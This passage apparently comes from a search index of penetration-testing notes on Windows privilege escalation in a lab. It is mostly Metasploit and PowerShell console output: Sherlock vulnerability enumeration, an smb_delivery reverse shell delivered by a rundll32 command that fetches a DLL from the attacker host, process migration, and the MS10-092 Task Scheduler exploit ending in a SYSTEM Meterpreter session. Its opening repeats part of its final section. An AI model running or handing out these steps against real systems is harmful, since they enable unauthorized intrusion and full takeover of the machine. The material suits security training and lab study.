task... [*] SUCCESS: The parameters of scheduled task \"isqR4gw3RlxnplB\" have been changed. [*] SCHELEVATOR [*] Enabling the task... [*] SUCCESS: The parameters of scheduled task \"isqR4gw3RlxnplB\" have been changed. [*] SCHELEVATOR [*] Executing the task... [*] Sending stage (175174 bytes) to 10.129.43.15 [*] SUCCESS: Attempted to run the scheduled task \"isqR4gw3RlxnplB\". [*] SCHELEVATOR [*] Deleting the task... [*] Meterpreter session 2 opened (10.10.14.3:4443 -> 10.129.43.15:49634) at 2021-05-12 16:04:34 -0400 [*] SUCCESS: The scheduled task \"isqR4gw3RlxnplB\" was successfully deleted. [*] SCHELEVATOR meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM meterpreter > sysinfo Computer : WINLPE-2K8 OS : Windows 2008 R2 (6.1 Build 7600). Architecture : x64 System Language : en_US Domain : WORKGROUP Logged On Users : 3 Meterpreter : x86/windows","title":"Windows Server"},{"location":"windows_privesc/windows_server/#querying-current-patch-level","text":"C:\\htb> wmic qfe Caption CSName Description FixComments HotFixID InstallDate InstalledBy InstalledOn Name ServicePackInEffect Status http://support.microsoft.com/?kbid=2533552 WINLPE-2K8 Update KB2533552 WINLPE-2K8\\Administrator 3/31/2021 A quick Google search of the last installed hotfix shows us that this system is very far out of date.","title":"Querying Current Patch Level"},{"location":"windows_privesc/windows_server/#running-sherlock","text":"PS C :\\ htb > Set-ExecutionPolicy bypass -Scope process Execution Policy Change The execution policy helps protect you from scripts that you do not trust . Changing the execution policy might expose you to the security risks described in the about_Execution_Policies help topic . Do you want to change the execution policy ? [Y] Yes [N] No [S] Suspend [?] Help ( default is \"Y\" ): Y PS C :\\ htb > Import-Module .\\ Sherlock . ps1 PS C :\\ htb > Find-AllVulns Title : User Mode to Ring ( KiTrap0D ) MSBulletin : MS10 - 015 CVEID : 2010 - 0232 Link : https :// www . exploit-db . com / exploits / 11199 / VulnStatus : Not supported on 64-bit systems Title : Task Scheduler . XML MSBulletin : MS10 - 092 CVEID : 2010 - 3338 , 2010 - 3888 Link : https :// www . exploit-db . com / exploits / 19930 / VulnStatus : Appears Vulnerable Title : NTUserMessageCall Win32k Kernel Pool Overflow MSBulletin : MS13 - 053 CVEID : 2013 - 1300 Link : https :// www . exploit-db . com / exploits / 33213 / VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenuEx Win32k NULL Page MSBulletin : MS13 - 081 CVEID : 2013 - 3881 Link : https :// www . exploit-db . com / exploits / 31576 / VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenu Win32k Null Pointer Dereference MSBulletin : MS14 - 058 CVEID : 2014 - 4113 Link : https :// www . exploit-db . com / exploits / 35101 / VulnStatus : Not Vulnerable Title : ClientCopyImage Win32k MSBulletin : MS15 - 051 CVEID : 2015 - 1701 , 2015 - 2433 Link : https :// www . exploit-db . com / exploits / 37367 / VulnStatus : Appears Vulnerable Title : Font Driver Buffer Overflow MSBulletin : MS15 - 078 CVEID : 2015 - 2426 , 2015 - 2433 Link : https :// www . exploit-db . com / exploits / 38222 / VulnStatus : Not Vulnerable Title : 'mrxdav.sys' WebDAV MSBulletin : MS16 - 016 CVEID : 2016 - 0051 Link : https :// www . exploit-db . com / exploits / 40085 / VulnStatus : Not supported on 64-bit systems Title : Secondary Logon Handle MSBulletin : MS16 - 032 CVEID : 2016 - 0099 Link : https :// www . exploit-db . com / exploits / 39719 / VulnStatus : Appears Vulnerable Title : Windows Kernel-Mode Drivers EoP MSBulletin : MS16 - 034 CVEID : 2016 - 0093 / 94 / 95 / 96 Link : https :// github . com / SecWiki / windows-kernel-exploits / thttps :// us-cert . cisa . gov / ncas / alerts / aa20 - 133aree / master / MS16 - 034 ? VulnStatus : Not Vulnerable Title : Win32k Elevation of Privilege MSBulletin : MS16 - 135 CVEID : 2016 - 7255 Link : https :// github . com / FuzzySecurity / PSKernel-Primitives / tree / master / Sample-Exploits / MS16 - 135 VulnStatus : Not Vulnerable Title : Nessus Agent 6 . 6 . 2 - 6 . 10 . 3 MSBulletin : N / A CVEID : 2017 - 7199 Link : https :// aspe1337 . blogspot . co . uk / 2017 / 04 / writeup-of-cve - 2017 - 7199 . html VulnStatus : Not Vulnerable Obtaining Meterpreter Shell msf6 exploit(windows/smb/smb_delivery) > search smb_delivery Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/smb_delivery 2016-07-26 excellent No SMB Delivery Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/smb_delivery msf6 exploit(windows/smb/smb_delivery) > use 0 [*] Using configured payload windows/meterpreter/reverse_tcp msf6 exploit(windows/smb/smb_delivery) > show options Module options (exploit/windows/smb/smb_delivery): Name Current Setting Required Description ---- --------------- -------- ----------- FILE_NAME test.dll no DLL file name FOLDER_NAME no Folder name to share (Default none) SHARE no Share (Default Random) SRVHOST 10.10.14.3 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 445 yes The local port to listen on. Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.10.14.3 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 1 PSH msf6 exploit(windows/smb/smb_delivery) > show targets Exploit targets: Id Name -- ---- 0 DLL 1 PSH msf6 exploit(windows/smb/smb_delivery) > set target 0 target => 0 msf6 exploit(windows/smb/smb_delivery) > exploit [*] Exploit running as background job 1. [*] Exploit completed, but no session was created. [*] Started reverse TCP handler on 10.10.14.3:4444 [*] Started service listener on 10.10.14.3:445 [*] Server started. [*] Run the following command on the target machine: rundll32.exe \\\\10.10.14.3\\lEUZam\\test.dll,0 Rundll Command on Target Host C:\\htb> rundll32.exe \\\\10.10.14.3\\lEUZam\\test.dll,0 Receiving Reverse Shell msf6 exploit(windows/smb/smb_delivery) > [*] Sending stage (175174 bytes) to 10.129.43.15 [*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.43.15:49609) at 2021-05-12 15:55:05 -0400 Let's search for the MS10_092 Windows Task Scheduler '.XML' Privilege Escalation module. msf6 exploit(windows/smb/smb_delivery) > search 2010-3338 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/local/ms10_092_schelevator 2010-09-13 excellent Yes Windows Escalate Task Scheduler XML Privilege Escalation msf6 exploit(windows/smb/smb_delivery) use 0 Before using the module in question, we need to hop into our Meterpreter shell and migrate to a 64-bit process, or the exploit will not work. We could have also chosen an x64 Meterpeter payload during the smb_delivery step. msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1 [*] Starting interaction with 1... meterpreter > getpid Current pid: 2268 meterpreter > ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System 164 1800 VMwareUser.exe x86 2 WINLPE-2K8\\htb-student C:\\Program Files (x86)\\VMware\\VMware Tools\\VMwareUser.exe 244 2032 winlogon.exe 260 4 smss.exe 288 476 svchost.exe 332 324 csrss.exe 376 324 wininit.exe 476 376 services.exe 492 376 lsass.exe 500 376 lsm.exe 584 476 mscorsvw.exe 600 476 svchost.exe 616 476 msdtc.exe 676 476 svchost.exe 744 476 taskhost.exe x64 2 WINLPE-2K8\\htb-student C:\\Windows\\System32\\taskhost.exe 756 1800 VMwareTray.exe x86 2 WINLPE-2K8\\htb-student C:\\Program Files (x86)\\VMware\\VMware Tools\\VMwareTray.exe 764 476 svchost.exe 800 476 svchost.exe 844 476 svchost.exe 900 476 svchost.exe 940 476 svchost.exe 976 476 spoolsv.exe 1012 476 sppsvc.exe 1048 476 svchost.exe 1112 476 VMwareService.exe 1260 2460 powershell.exe x64 2 WINLPE-2K8\\htb-student C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 1408 2632 conhost.exe x64 2 WINLPE-2K8\\htb-student C:\\Windows\\System32\\conhost.exe 1464 900 dwm.exe x64 2 WINLPE-2K8\\htb-student C:\\Windows\\System32\\dwm.exe 1632 476 svchost.exe 1672 600 WmiPrvSE.exe 2140 2460 cmd.exe x64 2 WINLPE-2K8\\htb-student C:\\Windows\\System32\\cmd.exe 2256 600 WmiPrvSE.exe 2264 476 mscorsvw.exe 2268 2628 rundll32.exe x86 2 WINLPE-2K8\\htb-student C:\\Windows\\SysWOW64\\rundll32.exe 2460 2656 explorer.exe x64 2 WINLPE-2K8\\htb-student C:\\Windows\\explorer.exe 2632 2032 csrss.exe 2796 2632 conhost.exe x64 2 WINLPE-2K8\\htb-student C:\\Windows\\System32\\conhost.exe 2876 476 svchost.exe 3048 476 svchost.exe meterpreter > migrate 2796 [*] Migrating from 2268 to 2796... [*] Migration completed successfully. meterpreter > background [*] Backgrounding session 1... Now set up the privilege escalation module by specifying our current Meterpreter session. lhost=tun0 msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1 SESSION => 1 msf6 exploit(windows/local/ms10_092_schelevator) > set lhost 10.10.14.3 lhost => 10.10.14.3 msf6 exploit(windows/local/ms10_092_schelevator) > set lport 4443 lport => 4443 msf6 exploit(windows/local/ms10_092_schelevator) > show options Module options (exploit/windows/local/ms10_092_schelevator): Name Current Setting Required Description ---- --------------- -------- ----------- CMD no Command to execute instead of a payload SESSION 1 yes The session to run this module on. TASKNAME no A name for the created task (default random) Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.10.14.3 yes The listen address (an interface may be specified) LPORT 4443 yes The listen port Exploit target: Id Name -- ---- 0 Windows Vista, 7, and 2008 If all goes to plan, once we type exploit , we will receive a new Meterpreter shell as the NT AUTHORITY\\SYSTEM account and can move on to perform any necessary post-exploitation. msf6 exploit(windows/local/ms10_092_schelevator) > exploit [*] Started reverse TCP handler on 10.10.14.3:4443 [*] Preparing payload at C:\\Windows\\TEMP\\uQEcovJYYHhC.exe [*] Creating task: isqR4gw3RlxnplB [*] SUCCESS: The scheduled task \"isqR4gw3RlxnplB\" has successfully been created. [*] SCHELEVATOR [*] Reading the task file contents from C:\\Windows\\system32\\tasks\\isqR4gw3RlxnplB... [*] Original CRC32: 0x89b06d1a [*] Final CRC32: 0x89b06d1a [*] Writing our modified content back... [*] Validating task: isqR4gw3RlxnplB [*] [*] Folder: \\ [*] TaskName Next Run Time Status [*] ======================================== ====================== =============== [*] isqR4gw3RlxnplB 6/1/2021 1:04:00 PM Ready [*] SCHELEVATOR [*] Disabling the task... [*] SUCCESS: The parameters of scheduled task \"isqR4gw3RlxnplB\" have been changed. [*] SCHELEVATOR [*] Enabling the task... [*] SUCCESS: The parameters of scheduled task \"isqR4gw3RlxnplB\" have been changed. [*] SCHELEVATOR [*] Executing the task... [*] Sending stage (175174 bytes) to 10.129.43.15 [*] SUCCESS: Attempted to run the scheduled task \"isqR4gw3RlxnplB\". [*] SCHELEVATOR [*] Deleting the task... [*] Meterpreter session 2 opened (10.10.14.3:4443 -> 10.129.43.15:49634) at 2021-05-12 16:04:34 -0400 [*] SUCCESS: The scheduled task \"isqR4gw3RlxnplB\" was successfully deleted. [*] SCHELEVATOR meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM meterpreter > sysinfo Computer : WINLPE-2K8 OS : Windows 2008 R2 (6.1 Build 7600). Architecture : x64 System Language : en_US Domain : WORKGROUP Logged On Users : 3 Meterpreter : x86/windows","title":"Running Sherlock"}]}